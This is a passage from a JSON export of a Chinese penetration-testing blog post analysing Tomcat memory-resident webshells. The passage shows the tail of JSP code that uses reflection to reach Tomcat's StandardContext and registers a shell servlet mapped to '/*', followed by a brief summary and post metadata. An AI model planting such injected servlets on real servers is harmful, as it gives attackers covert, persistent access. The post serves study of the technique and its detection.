class=\"token keyword\">throws</span> <span class=\"token class-name\">ServletException</span><span class=\"token punctuation\">,</span> <span class=\"token class-name\">IOException</span> <span class=\"token punctuation\">{</span>\n             <span class=\"token function\">doGet</span><span class=\"token punctuation\">(</span>req<span class=\"token punctuation\">,</span> resp<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n         <span class=\"token punctuation\">}</span>\n\n    <span class=\"token punctuation\">}</span>\n\n    <span class=\"token class-name\">ServletShell</span> shellservlet <span class=\"token operator\">=</span> <span class=\"token keyword\">new</span> <span class=\"token class-name\">ServletShell</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token class-name\">String</span> servletname <span class=\"token operator\">=</span> shellservlet<span class=\"token punctuation\">.</span><span class=\"token function\">getClass</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span><span class=\"token function\">getSimpleName</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\n    <span class=\"token class-name\">Field</span> reqF <span class=\"token operator\">=</span> request<span class=\"token punctuation\">.</span><span class=\"token function\">getClass</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span><span class=\"token function\">getDeclaredField</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"request\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    reqF<span class=\"token punctuation\">.</span><span class=\"token function\">setAccessible</span><span class=\"token punctuation\">(</span><span class=\"token boolean\">true</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token class-name\">Request</span> req <span class=\"token operator\">=</span> <span class=\"token punctuation\">(</span><span class=\"token class-name\">Request</span><span class=\"token punctuation\">)</span> reqF<span class=\"token punctuation\">.</span><span class=\"token function\">get</span><span class=\"token punctuation\">(</span>request<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token class-name\">StandardContext</span> standardContext <span class=\"token operator\">=</span> <span class=\"token punctuation\">(</span><span class=\"token class-name\">StandardContext</span><span class=\"token punctuation\">)</span> req<span class=\"token punctuation\">.</span><span class=\"token function\">getContext</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\n\n    <span class=\"token class-name\">Wrapper</span> wrappershell <span class=\"token operator\">=</span> standardContext<span class=\"token punctuation\">.</span><span class=\"token function\">createWrapper</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\n    wrappershell<span class=\"token punctuation\">.</span><span class=\"token function\">setServlet</span><span class=\"token punctuation\">(</span>shellservlet<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\n    wrappershell<span class=\"token punctuation\">.</span><span class=\"token function\">setLoadOnStartup</span><span class=\"token punctuation\">(</span><span class=\"token number\">1</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    wrappershell<span class=\"token punctuation\">.</span><span class=\"token function\">setName</span><span class=\"token punctuation\">(</span>servletname<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    wrappershell<span class=\"token punctuation\">.</span><span class=\"token function\">setServletClass</span><span class=\"token punctuation\">(</span>shellservlet<span class=\"token punctuation\">.</span><span class=\"token function\">getClass</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span><span class=\"token function\">getName</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\n    standardContext<span class=\"token punctuation\">.</span><span class=\"token function\">addChild</span><span class=\"token punctuation\">(</span>wrappershell<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    standardContext<span class=\"token punctuation\">.</span><span class=\"token function\">addServletMappingDecoded</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"/*\"</span><span class=\"token punctuation\">,</span>servletname<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token operator\">%</span><span class=\"token operator\">&gt;</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n<h2 id=\"小结\"><a href=\"#小结\" class=\"headerlink\" title=\"小结\"></a>小结</h2><p>  这里只介绍了最基本的几种内存马，对于spring默认不解析jsp的有其他的利用方式，而且字节注入内存马和其他骚操作也有很广的利用场景，不少师傅也挖到了利用链，但在实战中写内存马一定要注意路径匹配问题，一旦把路由弄乱，影响测试方的正常业务，那就糟糕了。</p>\n","text":"Tomcat内存马简析 webshell木马配合webshell管理工具可以方便对于服务器、内网进行进一步的维权、入侵，随着对文件内容查杀、以Ai对流量特征和行为模式的查杀等等手段，普通文件形式的we...","link":"","photos":[],"count_time":{"symbolsCount":"26k","symbolsTime":"24 mins."},"categories":[{"name":"渗透测试","slug":"渗透测试","count":10,"path":"api/categories/渗透测试.json"}],"tags":[],"toc":"<ol class=\"toc\"><li class=\"toc-item toc-level-1\"><a class=\"toc-link\" href=\"#Tomcat%E5%86%85%E5%AD%98%E9%A9%AC%E7%AE%80%E6%9E%90\"><span class=\"toc-text\">Tomcat内存马简析</span></a><ol class=\"toc-child\"><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#%E5%89%8D%E7%BD%AE%E7%9F%A5%E8%AF%86\"><span class=\"toc-text\">前置知识</span></a></li><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#Listener%E5%86%85%E5%AD%98%E9%A9%AC\"><span class=\"toc-text\">Listener内存马</span></a></li><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#Filter%E5%86%85%E5%AD%98%E9%A9%AC\"><span class=\"toc-text\">Filter内存马</span></a></li><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#Servlet%E5%86%85%E5%AD%98%E9%A9%AC\"><span class=\"toc-text\">Servlet内存马</span></a></li><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#%E5%B0%8F%E7%BB%93\"><span class=\"toc-text\">小结</span></a></li></ol></li></ol>","author":{"name":"RainSec","slug":"blog-author","avatar":"https://jsd.cdn.zzko.cn/gh/L2ksy0d/image-host@master/20220714/logo.jpg","link":"/","description":"艺术家思维去思考问题，工匠创造精神去开发","socials":{"github":"","twitter":"","stackoverflow":"","wechat":"","qq":"","weibo":"","zhihu":"","csdn":"","juejin":"","customs":{}}},"mapped":true,"prev_post":{"title":"Ubuntu 更新内核到指定版本","uid":"13f80bc1c75f3199fa7b182a57317bf0","slug":"Ubuntu20.04 升级降级内核到指定版本","date":"2022-03-28T10:38:45.000Z","updated":"2023-09-29T03:48:35.105Z","comments":true,"path":"api/articles/Ubuntu20.04 升级降级内核到指定版本.json","keywords":null,"cover":"https://jsd.cdn.zzko.cn/gh/L2ksy0d/image-host@master/20220720/Ubuntucover.webp","text":"记一次更新内核到5.8.0-33-generic 更新到指定版本查看当前版本$ uname -r 4.15.0-101-generic $ lsb_release -a No LSB modules ...","link":"","photos":[],"count_time":{"symbolsCount":"2.5k","symbolsTime":"2 mins."},"categories":[{"name":"系统运维","slug":"系统运维","count":1,"path":"api/categories/系统运维.json"}],"tags":[{"name":"Linux","slug":"Linux","count":1,"path":"api/tags/Linux.json"}],"author":{"name":"RainSec","slug":"blog-author","avatar":"https://jsd.cdn.zzko.cn/gh/L2ksy0d/image-host@master/20220714/logo.jpg","link":"/","description":"艺术家思维去思考问题，工匠创造精神去开发","socials":{"github":"","twitter":"","stackoverflow":"","wechat":"","qq":"","weibo":"","zhihu":"","csdn":"","juejin":"","customs":{}}}},"next_post":{"title":"URLDNS调试那些小事","uid":"609cb3bd3160d9a24e01a566229d052d","slug":"URLDNS调试那些小事","date":"2022-03-26T10:48:45.000Z","updated":"2023-09-29T03:48:35.021Z","comments":true,"path":"api/articles/URLDNS调试那些小事.json","keywords":null,"cover":"https://jsd.cdn.zzko.cn/gh/L2ksy0d/image-host@master/20220720/what-is-dns.3wivpbhx9do.png","text":"URLDNS调试那些小事近期在看javaweb相关的知识，ysoserial作为反序列化利用链的神器，想稍微利用它来调试一个简单的urldns利用链，进而了解这个工具。 ysoserial链接：下载地...","link":"","photos":[],"count_time":{"symbolsCount":"2.2k","symbolsTime":"2 mins."},"categories":[{"name":"渗透测试","slug":"渗透测试","count":10,"path":"api/categories/渗透测试.json"}],"tags":[],"author":{"name":"RainSec","slug":"blog-author","avatar":"https://jsd.cdn.zzko.cn/gh/L2ksy0d/image-host@master/20220714/logo.jpg","link":"/","description":"艺术家思维去思考问题，工匠创造精神去开发","socials":{"github":"","twitter":"","stackoverflow":"","wechat":"","qq":"","weibo":"","zhihu":"","csdn":"","juejin":"","customs":{}}}}}